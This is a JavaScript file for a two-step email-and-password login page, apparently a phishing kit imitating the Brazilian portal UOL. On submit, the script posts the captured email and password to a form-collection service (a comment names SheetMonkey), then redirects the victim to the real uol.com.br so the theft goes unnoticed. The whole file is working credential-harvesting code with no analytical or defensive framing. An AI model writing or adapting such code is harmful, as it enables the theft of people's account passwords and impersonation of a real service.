document.addEventListener('DOMContentLoaded', () => {
    const emailStep = document.getElementById('emailStep');
    const passwordStep = document.getElementById('passwordStep');
    const continueBtn = document.getElementById('continueBtn');
    const editEmailBtn = document.getElementById('editEmailBtn');
    const emailInput = document.getElementById('emailInput');
    const displayEmail = document.getElementById('displayEmail');
    const passwordInput = document.getElementById('passwordInput');
    const showPasswordBtn = document.getElementById('showPasswordBtn');
    const loginForm = document.getElementById('loginForm');

    continueBtn.addEventListener('click', () => {
        if (emailInput.value.trim() !== '') {
            emailStep.classList.add('hidden');
            passwordStep.classList.remove('hidden');
            displayEmail.textContent = emailInput.value;
        }
    });

    editEmailBtn.addEventListener('click', () => {
        passwordStep.classList.add('hidden');
        emailStep.classList.remove('hidden');
    });

    showPasswordBtn.addEventListener('click', () => {
        if (passwordInput.type === 'password') {
            passwordInput.type = 'text';
            showPasswordBtn.textContent = 'ocultar';
        } else {
            passwordInput.type = 'password';
            showPasswordBtn.textContent = 'mostrar';
        }
    });

    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        if (emailInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
            // Submit form data to SheetMonkey
            const formData = new FormData(loginForm);
            try {
                await fetch(loginForm.action, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error('Error submitting form:', error);
            }
            
            // Redirect to UOL website
            window.location.href = 'https://www.uol.com.br/';
        }
    });
});